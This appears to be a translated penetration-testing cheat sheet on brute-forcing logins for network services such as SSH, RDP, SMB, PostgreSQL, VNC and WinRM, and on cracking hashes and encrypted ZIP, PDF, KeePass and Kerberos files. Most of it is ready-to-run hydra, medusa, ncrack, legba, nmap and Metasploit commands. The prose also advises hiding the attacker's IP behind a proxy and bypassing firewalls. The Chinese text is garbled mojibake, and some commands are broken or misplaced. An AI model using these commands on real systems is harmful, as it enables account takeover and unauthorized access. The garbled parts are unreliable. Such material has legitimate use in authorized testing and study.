PostgreSQLæ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„å¼€æºå…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰ã€‚åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šå°è¯•ä½¿ç”¨æš´åŠ›ç ´è§£æ–¹æ³•æ¥è·å–å¯¹æ•°æ®åº“çš„è®¿é—®æƒé™ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ç”¨äºæš´åŠ›ç ´è§£PostgreSQLæ•°æ®åº“çš„å·¥å…·å’Œèµ„æºï¼š

- **Hydra**: è¿™æ˜¯ä¸€ä¸ªå¿«é€Ÿçš„ç½‘ç»œç™»å½•ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼ŒåŒ…æ‹¬PostgreSQLã€‚å®ƒå¯ä»¥è¿›è¡Œå¹¶å‘è¿æ¥ï¼ŒåŠ å¿«ç ´è§£é€Ÿåº¦ã€‚
- **Ncrack**: è¿™ä¸ªå·¥å…·ç”±Nmapçš„å¼€å‘è€…åˆ›å»ºï¼Œæ—¨åœ¨å¸®åŠ©å…¬å¸è¿›è¡Œç½‘ç»œå®‰å…¨å®¡è®¡ã€‚å®ƒæ”¯æŒå¤šç§åè®®ï¼Œä¹ŸåŒ…æ‹¬PostgreSQLã€‚
- **Medusa**: ç±»ä¼¼äºHydraï¼ŒMedusaæ˜¯ä¸€ä¸ªé€Ÿåº¦æå¿«çš„å¹¶è¡Œç½‘ç»œç™»å½•ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§æœåŠ¡ã€‚

åœ¨å°è¯•æš´åŠ›ç ´è§£æ—¶ï¼Œåº”è¯¥æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

- **è´¦å·é”å®š**: ä¸€äº›ç³»ç»Ÿåœ¨å¤šæ¬¡ç™»å½•å¤±è´¥åä¼šé”å®šè´¦å·ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´æœåŠ¡ä¸­æ–­ï¼Œåº”è°¨æ…å¤„ç†ã€‚
- **å¯†ç ç­–ç•¥**: å¼ºå¯†ç ç­–ç•¥ä¼šä½¿æš´åŠ›ç ´è§£å˜å¾—æ›´åŠ å›°éš¾ã€‚äº†è§£ç›®æ ‡ç³»ç»Ÿçš„å¯†ç ç­–ç•¥å¯ä»¥å¸®åŠ©å®šåˆ¶ç ´è§£ç­–ç•¥ã€‚
- **ç½‘ç»œé™åˆ¶**: ç›®æ ‡ç³»ç»Ÿå¯èƒ½æœ‰é˜²ç«å¢™æˆ–å…¶ä»–ç½‘ç»œé™åˆ¶æªæ–½æ¥é˜»æ­¢æš´åŠ›ç ´è§£æ”»å‡»ã€‚äº†è§£è¿™äº›é™åˆ¶å¹¶æ‰¾åˆ°æ–¹æ³•ç»•è¿‡å®ƒä»¬æ˜¯å…³é”®ã€‚

ä½¿ç”¨è¿™äº›å·¥å…·æ—¶ï¼Œåº”å§‹ç»ˆéµå®ˆæ³•å¾‹å’Œé“å¾·è§„èŒƒã€‚æœªç»æˆæƒçš„è®¿é—®å¯èƒ½ä¼šå¯¼è‡´æ³•å¾‹åæœã€‚
```bash
hydra -L /root/Desktop/user.txt â€“P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> â€“U /root/Desktop/user.txt â€“P /root/Desktop/pass.txt â€“M postgres
ncrack â€“v â€“U /root/Desktop/user.txt â€“P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

æ‚¨å¯ä»¥ä» [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) ä¸‹è½½ `.deb` åŒ…è¿›è¡Œå®‰è£…ã€‚
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter â€“u <Username> <IP>
```
### RDP

Remote Desktop Protocol (RDP) æ˜¯ä¸€ç§ç”± Microsoft å¼€å‘çš„åè®®ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡ç½‘ç»œè¿æ¥åˆ°å¦ä¸€å°è®¡ç®—æœºã€‚æ”»å‡»è€…ç»å¸¸å°è¯•ä½¿ç”¨æš´åŠ›ç ´è§£æ–¹æ³•æ¥çŒœæµ‹å¯†ç ï¼Œä»¥ä¾¿æœªç»æˆæƒåœ°è®¿é—®ç›®æ ‡ç³»ç»Ÿã€‚

#### å·¥å…·å’Œèµ„æº

- **Hydra** - è¿™æ˜¯ä¸€ä¸ªå¿«é€Ÿçš„ç½‘ç»œç™»å½•ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼ŒåŒ…æ‹¬ RDPã€‚
- **Ncrack** - è¿™ä¸ªå·¥å…·æ˜¯ä¸“é—¨ä¸ºç½‘ç»œæœåŠ¡è®¾è®¡çš„ï¼Œå®ƒå¯ä»¥å¸®åŠ©è¿›è¡Œå¿«é€Ÿçš„å¯†ç ç ´è§£å°è¯•ã€‚
- **Crowbar** - å®ƒæ˜¯ä¸€ä¸ªé’ˆå¯¹ä¸åŒæœåŠ¡çš„æš´åŠ›ç ´è§£å·¥å…·ï¼Œä¹Ÿæ”¯æŒ RDPã€‚

#### æ–¹æ³•

1. ç¡®å®šç›®æ ‡ç³»ç»Ÿçš„ IP åœ°å€å’Œ RDP æœåŠ¡ç«¯å£ï¼ˆé»˜è®¤ä¸º 3389ï¼‰ã€‚
2. é€‰æ‹©ä¸€ä¸ªå·¥å…·å¹¶é…ç½®å¿…è¦çš„å‚æ•°ï¼Œå¦‚ç›®æ ‡ IPã€ç«¯å£å’Œç”¨æˆ·ååˆ—è¡¨ã€‚
3. ä½¿ç”¨å¯†ç å­—å…¸æˆ–ç”Ÿæˆå¯†ç ç»„åˆæ¥å°è¯•ç™»å½•ã€‚
4. ç›‘æ§è¿›ç¨‹å¹¶è®°å½•æˆåŠŸçš„ç™»å½•å°è¯•ã€‚

#### æ³¨æ„äº‹é¡¹

- ç¡®ä¿åœ¨è¿›è¡Œæš´åŠ›ç ´è§£æ—¶éµå®ˆæ³•å¾‹å’Œé“å¾·è§„èŒƒã€‚
- æš´åŠ›ç ´è§£å¯èƒ½ä¼šåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šäº§ç”Ÿå¤§é‡æ—¥å¿—è®°å½•ï¼Œå¯èƒ½è§¦å‘å®‰å…¨è­¦æŠ¥ã€‚
- ä½¿ç”¨ä»£ç†æˆ– VPN æ¥é¿å…ç›´æ¥æš´éœ²æ”»å‡»è€…çš„ IP åœ°å€ã€‚
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra â€“P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

(æ­¤éƒ¨åˆ†ä¿æŒåŸæ ·ï¼Œä¸éœ€è¦ç¿»è¯‘)
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin (remote login) æ˜¯ä¸€ç§å…è®¸ç”¨æˆ·åœ¨å¦ä¸€å°è®¡ç®—æœºä¸Šç™»å½•çš„ UNIX å‘½ä»¤ã€‚è¿™ä¸ªè¿‡ç¨‹é€šå¸¸ä¸ä½¿ç”¨åŠ å¯†ï¼Œå› æ­¤å¯èƒ½ä¼šå—åˆ°ä¸­é—´äººæ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥å°è¯•ä½¿ç”¨æš´åŠ›ç ´è§£æ¥è·å–è®¿é—®æƒé™ã€‚

### Brute Force Attack

æš´åŠ›ç ´è§£æ”»å‡»æ˜¯ä¸€ç§è¯•å›¾çŒœæµ‹æ‰€æœ‰å¯èƒ½çš„å¯†ç ç»„åˆä»¥è·å¾—æœªæˆæƒè®¿é—®çš„æ–¹æ³•ã€‚è¿™ç§æ–¹æ³•å¯èƒ½ä¼šè€—è´¹å¤§é‡æ—¶é—´ï¼Œå–å†³äºå¯†ç çš„å¤æ‚æ€§å’Œæ”»å‡»è€…ä½¿ç”¨çš„å·¥å…·ã€‚

#### Tools

ä»¥ä¸‹æ˜¯ä¸€äº›ç”¨äºæš´åŠ›ç ´è§£çš„å·¥å…·ï¼š

- **Hydra**: è¿™æ˜¯ä¸€ä¸ªå¿«é€Ÿçš„ç½‘ç»œç™»å½•ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ã€‚
- **John the Ripper**: è¿™æ˜¯ä¸€ä¸ªæµè¡Œçš„å¯†ç ç ´è§£å·¥å…·ï¼Œå¯ä»¥å¤„ç†å¤šç§å¯†ç å“ˆå¸Œç±»å‹ã€‚
- **CrackMapExec**: è¿™æ˜¯ä¸€ä¸ªåæ¸—é€å·¥å…·ï¼Œä¹Ÿå¯ä»¥ç”¨äºæš´åŠ›ç ´è§£ã€‚

#### Resources

- **SecLists**: è¿™æ˜¯ä¸€ä¸ªå®‰å…¨æµ‹è¯•è€…ä½¿ç”¨çš„å¯†ç åˆ—è¡¨ã€ç”¨æˆ·ååˆ—è¡¨å’Œå…¶ä»–ç±»å‹æ•°æ®çš„é›†åˆã€‚
- **Hashcat**: è¿™æ˜¯ä¸–ç•Œä¸Šæœ€å¿«çš„å¯†ç æ¢å¤å·¥å…·ä¹‹ä¸€ã€‚

### Password Spraying

å¯†ç å–·å°„æ˜¯ä¸€ç§æš´åŠ›ç ´è§£çš„å˜ä½“ï¼Œå®ƒä½¿ç”¨ä¸€ä¸ªå¯†ç å°è¯•è®¿é—®å¤šä¸ªè´¦æˆ·ï¼Œè€Œä¸æ˜¯å¯¹ä¸€ä¸ªè´¦æˆ·å°è¯•å¤šä¸ªå¯†ç ã€‚è¿™ç§æ–¹æ³•å¯ä»¥é¿å…è´¦æˆ·å› å°è¯•æ¬¡æ•°è¿‡å¤šè€Œè¢«é”å®šã€‚

### Credential Stuffing

å‡­è¯å¡«å……æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–æ”»å‡»ï¼Œæ”»å‡»è€…ä½¿ç”¨ä»å…¶ä»–æ³„éœ²ä¸­è·å–çš„ç”¨æˆ·åå’Œå¯†ç ç»„åˆå°è¯•ç™»å½•åˆ°ä¸åŒçš„ç½‘ç«™ã€‚ç”±äºè®¸å¤šç”¨æˆ·ä¼šé‡å¤ä½¿ç”¨å¯†ç ï¼Œè¿™ç§æ–¹æ³•å¯èƒ½ä¼šæœ‰ä¸€å®šçš„æˆåŠŸç‡ã€‚
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP (å®æ—¶æµä¼ è¾“åè®®)
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMPï¼ˆç®€å•ç½‘ç»œç®¡ç†åè®®ï¼‰æ˜¯ç”¨äºç®¡ç†ç½‘ç»œä¸Šè®¾å¤‡çš„ä¸€ç§åè®®ã€‚é€šè¿‡ä½¿ç”¨ä¸åŒç‰ˆæœ¬çš„SNMPï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•åˆ©ç”¨é»˜è®¤çš„æˆ–å¼±çš„ç¤¾åŒºå­—ç¬¦ä¸²æ¥è·å–æ•æ„Ÿä¿¡æ¯ã€‚

#### å·¥å…·

ä»¥ä¸‹æ˜¯ä¸€äº›ç”¨äºSNMPçˆ†ç ´çš„å·¥å…·ï¼š

- **onesixtyone** - å¿«é€Ÿæ‰«æå¤§å‹ç½‘ç»œä»¥å¯»æ‰¾å¼€æ”¾çš„SNMPæœåŠ¡ã€‚
- **snmpcheck** - æ— éœ€ç¤¾åŒºå­—ç¬¦ä¸²å³å¯æå–SNMPä¿¡æ¯ã€‚
- **snmpwalk** - ç”¨äºéå†SNMPèŠ‚ç‚¹çš„å·¥å…·ã€‚
- **snmpbrute** - ç”¨äºå¯¹SNMPæœåŠ¡è¿›è¡Œçˆ†ç ´çš„å·¥å…·ã€‚

#### æ–¹æ³•

1. **è¯†åˆ«ç›®æ ‡** - ä½¿ç”¨å·¥å…·å¦‚Nmapç¡®å®šç›®æ ‡ç½‘ç»œä¸­çš„SNMPæœåŠ¡ã€‚
2. **æšä¸¾** - ä½¿ç”¨onesixtyoneæˆ–snmpwalkç­‰å·¥å…·æšä¸¾ä¿¡æ¯ã€‚
3. **çˆ†ç ´** - å¦‚æœéœ€è¦ï¼Œä½¿ç”¨snmpbruteç­‰å·¥å…·å°è¯•ç ´è§£ç¤¾åŒºå­—ç¬¦ä¸²ã€‚
4. **åˆ†æ** - åˆ†æè·å–çš„ä¿¡æ¯ï¼Œå¯»æ‰¾æ•æ„Ÿæ•°æ®æ³„éœ²æˆ–é…ç½®é—®é¢˜ã€‚

#### èµ„æº

- [SNMP Enumeration Guide](https://book.hacktricks.xyz/pentesting/161-pentesting-snmp)
- [snmpwalk Documentation](http://www.net-snmp.org/docs/man/snmpwalk.html)
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt â€“P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> â€“U /root/Desktop/user.txt â€“P /root/Desktop/pass.txt â€“M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) æ˜¯ä¸€ç§ç½‘ç»œåè®®ï¼Œç”¨äºåŠ å¯†æ–¹å¼è¿œç¨‹ç™»å½•å’Œæ“ä½œè®¡ç®—æœºç³»ç»Ÿã€‚SSH æä¾›äº†ä¸€ç§å®‰å…¨çš„æ–¹æ³•ï¼Œé€šè¿‡ä¸å®‰å…¨çš„ç½‘ç»œç¯å¢ƒä¸­ï¼Œå¯¹æœåŠ¡å™¨è¿›è¡Œè®¿é—®å’Œç®¡ç†ã€‚

#### Brute Force Attack

åœ¨ SSH ä¸­ï¼Œæš´åŠ›ç ´è§£æ”»å‡»æ˜¯ä¸€ç§å¸¸è§çš„æ”»å‡»æ‰‹æ®µï¼Œæ”»å‡»è€…å°è¯•çŒœæµ‹æˆ–ç©·ä¸¾ç”¨æˆ·åå’Œå¯†ç ï¼Œä»¥è·å¾—å¯¹ç›®æ ‡ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚è¿™ç§æ–¹æ³•é€šå¸¸æ¶‰åŠè‡ªåŠ¨åŒ–å·¥å…·ï¼Œå¯ä»¥å¿«é€Ÿå°è¯•æˆåƒä¸Šä¸‡çš„ç”¨æˆ·åå’Œå¯†ç ç»„åˆã€‚

#### é˜²å¾¡æªæ–½

- **ä½¿ç”¨å¼ºå¯†ç **ï¼šç¡®ä¿æ‰€æœ‰ç”¨æˆ·è´¦æˆ·éƒ½æœ‰å¼ºå¤§ã€å¤æ‚çš„å¯†ç ã€‚
- **é™åˆ¶å°è¯•æ¬¡æ•°**ï¼šé€šè¿‡é…ç½® SSH æœåŠ¡æ¥é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°ï¼Œå¯ä»¥å‡ç¼“æ”»å‡»é€Ÿåº¦ã€‚
- **ä½¿ç”¨å¯†é’¥è®¤è¯**ï¼šä½¿ç”¨åŸºäºå¯†é’¥çš„è®¤è¯è€Œä¸æ˜¯å¯†ç è®¤è¯ï¼Œå¯ä»¥å¤§å¤§æé«˜å®‰å…¨æ€§ã€‚
- **æ›´æ”¹é»˜è®¤ç«¯å£**ï¼šå°† SSH æœåŠ¡ä»é»˜è®¤çš„ç«¯å£ 22 æ›´æ”¹åˆ°å…¶ä»–ç«¯å£ï¼Œå¯ä»¥å‡å°‘è‡ªåŠ¨åŒ–æ”»å‡»ã€‚
- **ä½¿ç”¨é˜²ç«å¢™**ï¼šé…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œåªå…è®¸å¯ä¿¡çš„ IP åœ°å€è¿›è¡Œ SSH è¿æ¥ã€‚
- **ä½¿ç”¨åŒå› ç´ è®¤è¯**ï¼šå¢åŠ ä¸€ä¸ªé¢å¤–çš„è®¤è¯æ­¥éª¤ï¼Œå¦‚ä½¿ç”¨æ‰‹æœºåº”ç”¨ç”Ÿæˆçš„ä¸€æ¬¡æ€§å¯†ç ã€‚

#### å·¥å…·

- **Hydra**ï¼šä¸€ä¸ªå¿«é€Ÿçš„å¯†ç ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼ŒåŒ…æ‹¬ SSHã€‚
- **Ncrack**ï¼šä¸€ç§ç½‘ç»œè®¤è¯ç ´è§£å·¥å…·ï¼Œè®¾è®¡ç”¨äºé«˜é€Ÿæš´åŠ›ç ´è§£ã€‚
- **Medusa**ï¼šä¸€ç§é€Ÿåº¦æå¿«çš„å¹¶è¡Œæš´åŠ›ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§æœåŠ¡ã€‚

é€šè¿‡è¿™äº›å·¥å…·å’Œæ–¹æ³•ï¼Œå¯ä»¥æœ‰æ•ˆåœ°æµ‹è¯•å’ŒåŠ å¼º SSH æœåŠ¡çš„å®‰å…¨æ€§ã€‚
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### å¼±SSHå¯†é’¥ / Debianå¯é¢„æµ‹çš„PRNG

æŸäº›ç³»ç»Ÿåœ¨ç”¨äºç”ŸæˆåŠ å¯†ææ–™çš„éšæœºç§å­ä¸­å­˜åœ¨å·²çŸ¥ç¼ºé™·ã€‚è¿™å¯èƒ½å¯¼è‡´å¯†é’¥ç©ºé—´å¤§å¹…å‡å°‘ï¼Œå¯ä»¥ä½¿ç”¨å¦‚[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)ç­‰å·¥å…·è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ä¹Ÿæœ‰é¢„ç”Ÿæˆçš„å¼±å¯†é’¥é›†å¯ç”¨ï¼Œä¾‹å¦‚[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)ã€‚

### STOMP (ActiveMQ, RabbitMQ, HornetQ å’Œ OpenMQ)

STOMPæ–‡æœ¬åè®®å…è®¸ä¸æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡è¿›è¡Œäº¤äº’ï¼Œå¦‚ActiveMQ, RabbitMQ, HornetQ å’Œ OpenMQã€‚
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC
```bash
hydra -L /root/Desktop/user.txt â€“P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> â€“u root -P /root/Desktop/pass.txt â€“M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt â€“t 1 â€“x retry:fgep!='Authentication failure' --max-retries 0 â€“x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## æœ¬åœ°

### åœ¨çº¿ç ´è§£æ•°æ®åº“

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?)ï¼ˆMD5 & SHA1ï¼‰
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php)ï¼ˆMSCHAPv2/PPTP-VPN/NetNTLMv1 å¸¦/ä¸å¸¦ ESS/SSP ä»¥åŠä»»ä½•æŒ‘æˆ˜å€¼ï¼‰
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com)ï¼ˆå“ˆå¸Œå€¼ã€WPA2 æŠ“åŒ…å’Œ MSOfficeã€ZIPã€PDF å½’æ¡£æ–‡ä»¶ï¼‰
* [https://crackstation.net/](https://crackstation.net)ï¼ˆå“ˆå¸Œå€¼ï¼‰
* [https://md5decrypt.net/](https://md5decrypt.net)ï¼ˆMD5ï¼‰
* [https://gpuhash.me/](https://gpuhash.me)ï¼ˆå“ˆå¸Œå€¼å’Œæ–‡ä»¶å“ˆå¸Œå€¼ï¼‰
* [https://hashes.org/search.php](https://hashes.org/search.php)ï¼ˆå“ˆå¸Œå€¼ï¼‰
* [https://www.cmd5.org/](https://www.cmd5.org)ï¼ˆå“ˆå¸Œå€¼ï¼‰
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker)ï¼ˆMD5ã€NTLMã€SHA1ã€MySQL5ã€SHA256ã€SHA512ï¼‰
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html)ï¼ˆMD5ï¼‰
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

åœ¨å°è¯•æš´åŠ›ç ´è§£å“ˆå¸Œä¹‹å‰ï¼Œè¯·å…ˆæŸ¥çœ‹è¿™äº›èµ„æºã€‚

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### å·²çŸ¥æ˜æ–‡çš„zipæ”»å‡»

æ‚¨éœ€è¦çŸ¥é“åŠ å¯†zipå†…éƒ¨åŒ…å«çš„æ–‡ä»¶çš„**æ˜æ–‡**ï¼ˆæˆ–éƒ¨åˆ†æ˜æ–‡ï¼‰ã€‚æ‚¨å¯ä»¥é€šè¿‡è¿è¡Œï¼š**`7z l encrypted.zip`**æ¥æ£€æŸ¥åŠ å¯†zipå†…éƒ¨åŒ…å«çš„**æ–‡ä»¶åå’Œæ–‡ä»¶å¤§å°**ã€‚\
ä»å‘å¸ƒé¡µé¢ä¸‹è½½ [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)ã€‚
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDFæ‰€æœ‰è€…å¯†ç 

è¦ç ´è§£PDFæ‰€æœ‰è€…å¯†ç ï¼Œè¯·æŸ¥çœ‹æ­¤å†…å®¹ï¼š[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM ç ´è§£
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks å›¾åƒ

